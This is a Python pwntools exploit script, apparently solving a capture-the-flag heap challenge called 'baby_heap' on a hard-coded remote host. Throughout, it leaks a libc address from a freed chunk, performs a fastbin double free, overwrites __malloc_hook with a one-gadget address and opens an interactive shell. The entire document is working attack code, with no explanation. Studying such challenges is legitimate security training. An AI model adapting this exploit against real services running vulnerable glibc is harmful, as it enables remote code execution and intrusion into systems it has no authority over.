from pwn import *

ip = "140.110.112.77"
port = 4008

context.arch = "amd64"

r = remote(ip, port)
# r = process("./baby_heap")

Libc = ELF("./libc-2.23.so")

def Add(sz, data):
    r.sendlineafter(">", "1")
    r.sendlineafter(":", str(sz))
    r.sendlineafter(":", data)

def Show(idx):
    r.sendlineafter(">", "2")
    r.sendlineafter(":", str(idx))

def Delete(idx):
    r.sendlineafter(">", "3")
    r.sendlineafter(":", str(idx))

Add(0x60, "aaaa")
Add(0x400, "bbbb")
Add(0x60, "cccc")
Delete(1)
Show(1)

libc = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x3c4b78
Libc.address = libc
log.info(hex(libc))

Delete(0)
Delete(2)
Delete(0)

Add(0x60, p64(Libc.sym["__malloc_hook"] - 0x23))
Add(0x60, "dddd")
Add(0x60, "eeee")
Add(0x60, b"\x00" * 0x13 + p64(libc + 0xf02a4))

Delete(0)
Delete(0)

r.interactive()
